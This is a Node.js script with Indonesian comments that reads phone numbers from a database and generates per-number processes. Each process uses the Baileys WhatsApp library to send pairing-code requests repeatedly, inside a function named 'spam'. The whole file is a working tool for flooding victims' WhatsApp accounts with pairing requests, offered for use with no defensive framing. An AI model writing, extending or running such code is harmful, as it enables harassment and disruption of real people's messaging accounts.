const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

// Path file database
const dbPath = path.resolve(__dirname, "../database/db.js");
const systemDir = path.resolve(__dirname, "system");

// Pastikan folder `system` ada
if (!fs.existsSync(systemDir)) {
  fs.mkdirSync(systemDir);
}

// Fungsi untuk menghasilkan nama file acak
function generateRandomFileName() {
  return `process-${crypto.randomBytes(4).toString("hex")}.js`;
}

// Fungsi untuk membuat file proses
function createProcessFile(uuid, nomor, delay) {
  const processCode = `
const { makeWASocket, Browsers, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require("pino");

(async () => {
  async function spam(nomor, delay) {
    try {
      const { state } = await useMultiFileAuthState("auth-${uuid}");

      const client = makeWASocket({
        printQRInTerminal: false,
        browser: Browsers.macOS("Edge"),
        auth: state,
        logger: pino({ level: "fatal" }),
      });

      console.log(\`[START] Mengirim pairing request ke \${nomor}\`);
      const intervalId = setInterval(async () => {
        try {
          await client.requestPairingCode(nomor);
          console.log(\`[SUCCESS] Pairing request sent to \${nomor}\`);
        } catch (err) {
          console.error(\`[ERROR] Gagal mengirim pairing request ke \${nomor}:\`, err.message);
        }
      }, delay);

      // Hentikan setelah 20 detik
      setTimeout(() => {
        clearInterval(intervalId);
        console.log(\`[STOP] Menghentikan pairing request ke \${nomor}\`);
        process.exit(0);
      }, 20000);
    } catch (err) {
      console.error("[ERROR] Terjadi kesalahan saat inisialisasi:", err.message);
      process.exit(1);
    }
  }

  spam("${nomor}", ${delay});
})();
`;

  const fileName = generateRandomFileName();
  const filePath = path.resolve(systemDir, fileName);
  fs.writeFileSync(filePath, processCode, "utf-8");
  console.log(`[INFO] File ${fileName} berhasil dibuat di folder system.`);
  return fileName;
}

// Fungsi utama untuk membaca database dan membuat file proses
function generateAllProcessFiles() {
  console.log("[INFO] Membaca database...");
  try {
    delete require.cache[require.resolve(dbPath)];
    const dbData = require(dbPath);
    const processFiles = [];

    for (const uuid in dbData) {
      const numbers = dbData[uuid]?.numbers;
      if (numbers) {
        for (const key in numbers) {
          const [nomor, delay] = numbers[key];
          const processFile = createProcessFile(uuid, nomor, delay);
          processFiles.push({ fileName: processFile, nomor });
        }
      }
    }

    fs.writeFileSync(path.resolve(systemDir, "process-files.json"), JSON.stringify(processFiles), "utf-8");
    console.log("[INFO] Semua file proses berhasil dibuat.");
  } catch (error) {
    console.error("[ERROR] Gagal membaca file db.js:", error.message);
  }
}

// Jalankan fungsi utama
generateAllProcessFiles();